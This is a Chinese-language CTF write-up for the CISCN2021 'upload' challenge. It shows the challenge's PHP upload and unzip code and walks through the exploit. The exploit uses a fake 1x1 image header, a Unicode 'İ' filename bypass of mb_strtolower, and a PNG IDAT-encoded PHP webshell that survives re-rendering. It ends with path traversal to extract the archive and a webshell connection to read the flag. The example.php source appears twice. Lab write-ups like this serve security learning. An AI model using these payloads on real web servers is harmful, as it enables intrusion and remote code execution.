---
title: '[CISCN2021 Quals]upload'
date: 2024-11-03 16:23:24
tags: 
      - 文件上传
      - unicode字符绕过
categories: 刷题笔记
---

## [CISCN2021 Quals]upload

我们在页面中发现源码

```
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```

通过审计代码，我们发现它限制了图片的大小，长宽，以及一些字母

`$_FILES`会把上传的文件的各个部分保存到相应的键上，例如：第一个`[]`内就是在客户端的定位，本题是`postedFile`，也就是说本题要构造上传页面，`<input type="file" name="postedFile">`，要这样提交。

```
<input type="file" name="userfile">
$_FILES数组内容如下:
$_FILES['userfile']['name']
客户端机器文件的原名称。
$_FILES['userfile']['type'] 
文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。
$_FILES['userfile']['size'] 
已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 
文件被上传后在服务端储存的临时文件名。
$_FILES['userfile']['error'] 
和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。
注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILES 数组。

```

getimagesize在接受任何图像文件的时候会把文件以数组类型保存

```
Array
(
    [0] => 290	#图像宽度的像素值
    [1] => 69	#图像高度的像素值
    [2] => 3	#图像的类型
    [3] => width="290" height="69"	#宽度和高度的字符串
    [bits] => 8	#图像的每种颜色的位数，二进制格式
    [mime] => image/png	#给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息
)


```

那么第三个`if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1)`我们就可以这样绕过

```
#define width 1
#define height 1
```

由于代码过滤了c，i，h，所以常用的文件上传后缀都不能使用了

我们扫描目录发现还有个/example.php页面

```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```

这个页面的功能主要就是解压缩zip格式文件，并且重新渲染png文件也就是二次渲染。

那么也就是上传一个zip文件，但在upload.php中把i过滤了，可以用利用`mb_strtolower`解析漏洞来unicode字符代替绕过。

```php
可以利用一些unicode字符绕过。
<?php
var_dump(mb_strtolower('İ')==='i');
?>
结果为true
且前面还进行了url解密。所以可以用%c4%b0代替'İ'字符
```

为了绕过图片的二次渲染并实现木马的写入我们使用这个脚本。

https://github.com/huntergregal/PNG-IDAT-Payload-Generator/

我们首先要修改脚本中的payload

![image-20241103200123313](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032001451.png)

![image-20241103200133647](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032001674.png)

输出为16进制

![image-20241103200204544](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032002579.png)

```
[<?=EVAL($_POST[1]); ?>X               x后面有两个不可见字符，16进制编码后用00 00补上
a39f67641d201612546f112e29152b2167226b505050506f5f5310 
```

然后我们修改脚本

![image-20241103200357738](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032003771.png)

运行脚本后，将得到的png文件后缀改为php，并解压为zip格式

![image-20241103200441752](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032004781.png)

我们写个文件上传页面

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://9b8305c0-3790-4261-badc-143033f6cc9b.node5.buuoj.cn:81/upload.php?ctf=upload" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

上传文件并抓包

由于文件将zip过滤了，我们将i用unicode字符代替再进行url编码后得到%c4%b0

```
filename="a.z%c4%b0p"
```

然后再在zip文件下加上

```
#define width 1
#define height 1
```

![image-20241103201827884](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032018954.png)

上传成功后

我们访问examp.php解压文件

```
/example.php?ctf=poc
file=../image/a.zip
```

![image-20241103202220698](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032022743.png)

解压成功后，我们访问/examp/a.php

![image-20241103202301657](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032023700.png)

成功上传了，我们搁蚁剑连接

```
/etc/fllagggaaaa/ejklwfthreu8rt/fgrtgergyer/ergerhrtytrh/rtehtrhytryhre/gfhtryrtgrewfre34t/t43ft34f/flag11e3kerjh3u
```

再这里找到flag

![image-20241103202406132](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411032024162.png)
